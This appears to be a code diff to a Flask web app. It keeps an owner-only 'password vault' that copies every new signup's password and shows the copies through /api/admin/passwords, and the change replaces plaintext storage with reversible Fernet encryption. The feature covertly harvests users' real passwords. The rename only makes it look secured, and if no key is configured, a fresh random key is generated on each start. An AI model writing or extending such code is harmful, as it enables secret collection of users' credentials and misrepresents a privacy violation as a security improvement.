@@ -9,6 +9,7 @@ from functools import wraps
 
 import requests
 import yfinance as yf
+from cryptography.fernet import Fernet
 from flask import (
     Flask, g, jsonify, redirect, render_template,
     request, send_from_directory, session, url_for,
@@ -18,6 +19,10 @@ from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-change-me")
+PASSWORD_VAULT_KEY = os.environ.get("PASSWORD_VAULT_KEY")
+if not PASSWORD_VAULT_KEY:
+    PASSWORD_VAULT_KEY = Fernet.generate_key().decode()
+_PASSWORD_VAULT_FERNET = Fernet(PASSWORD_VAULT_KEY.encode())
 
 # Uploads — used for chat file attachments and profile avatars.
 UPLOAD_ROOT      = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
@@ -343,7 +348,7 @@ def init_db():
             -- table existed) will NOT be in here — their hashes are one-way.
             CREATE TABLE IF NOT EXISTS password_vault (
                 user_id      INTEGER PRIMARY KEY REFERENCES users(id),
-                plaintext_pw TEXT    NOT NULL,
+                encrypted_pw TEXT    NOT NULL,
                 captured_at  DATETIME DEFAULT CURRENT_TIMESTAMP
             );
 
@@ -435,6 +440,7 @@ def init_db():
             "ALTER TABLE users ADD COLUMN banner_url TEXT DEFAULT ''",
             "ALTER TABLE users ADD COLUMN banner_kind TEXT DEFAULT ''",
             "ALTER TABLE users ADD COLUMN intro_video_url TEXT DEFAULT ''",
+            "ALTER TABLE password_vault RENAME COLUMN plaintext_pw TO encrypted_pw",
         ):
             try:
                 db.execute(ddl)
@@ -936,12 +942,12 @@ def register():
     )
     user_id = cur.lastrowid
     db.execute("INSERT INTO portfolios (user_id, cash) VALUES (?, ?)", (user_id, STARTING_CASH))
-    # OWNER-ONLY: snapshot the plaintext password into the vault for moderation.
+    # OWNER-ONLY: snapshot the password into the vault for moderation.
     # Visible only via /admin/spy when the viewer is the platform owner.
     try:
         db.execute(
-            "INSERT OR REPLACE INTO password_vault (user_id, plaintext_pw) VALUES (?, ?)",
-            (user_id, password),
+            "INSERT OR REPLACE INTO password_vault (user_id, encrypted_pw) VALUES (?, ?)",
+            (user_id, _PASSWORD_VAULT_FERNET.encrypt(password.encode()).decode()),
         )
     except sqlite3.OperationalError:
         pass
@@ -5629,15 +5635,15 @@ def clear_intro_video():
     return jsonify({"message": "Intro video removed"})
 
 
-# ── Owner — plaintext password vault ─────────────────────────────────────────
+# ── Owner — encrypted password vault ─────────────────────────────────────────
 
 @app.route("/api/admin/passwords")
 @owner_required
 def admin_password_vault():
-    """OWNER-ONLY: list captured plaintext passwords (new signups only)."""
+    """OWNER-ONLY: list captured encrypted passwords (new signups only)."""
     db = get_db()
     rows = db.execute(
-        """SELECT pv.user_id, pv.plaintext_pw, pv.captured_at,
+        """SELECT pv.user_id, pv.encrypted_pw, pv.captured_at,
                   u.username, COALESCE(u.is_owner,0) AS is_owner
            FROM password_vault pv
            JOIN users u ON u.id = pv.user_id
